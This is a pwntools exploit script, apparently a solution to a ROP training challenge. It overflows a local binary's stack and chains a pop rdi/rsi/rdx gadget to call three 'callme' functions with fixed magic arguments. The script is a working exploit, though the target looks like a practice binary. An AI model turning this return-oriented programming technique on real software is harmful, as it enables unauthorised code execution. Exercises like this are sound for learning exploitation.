from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


p = start()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))

param1 = p64(0xdeadbeefdeadbeef)
param2 = p64(0xcafebabecafebabe)
param3 = p64(0xd00df00dd00df00d)

callme1 = e.sym['callme_one']
callme2 = e.sym['callme_two']
callme3 = e.sym['callme_three']

triple_pop = r.find_gadget(['pop rdi', 'pop rsi', 'pop rdx', 'ret'])[0]

r.raw(padding)

# callme1(0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d)
r.call(triple_pop)
r.raw(param1)
r.raw(param2)
r.raw(param3)
r.call(callme1)

# callme2(0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d)
r.call(triple_pop)
r.raw(param1)
r.raw(param2)
r.raw(param3)
r.call(callme2)

# callme3(0xdeadbeefdeadbeef,0xcafebabecafebabe,0xd00df00dd00df00d)
r.call(triple_pop)
r.raw(param1)
r.raw(param2)
r.raw(param3)
r.call(callme3)

log.info("callme chain:\n%s" % r.dump())
p.recvuntil(b'>')
p.sendline(bytes(r))

p.interactive()
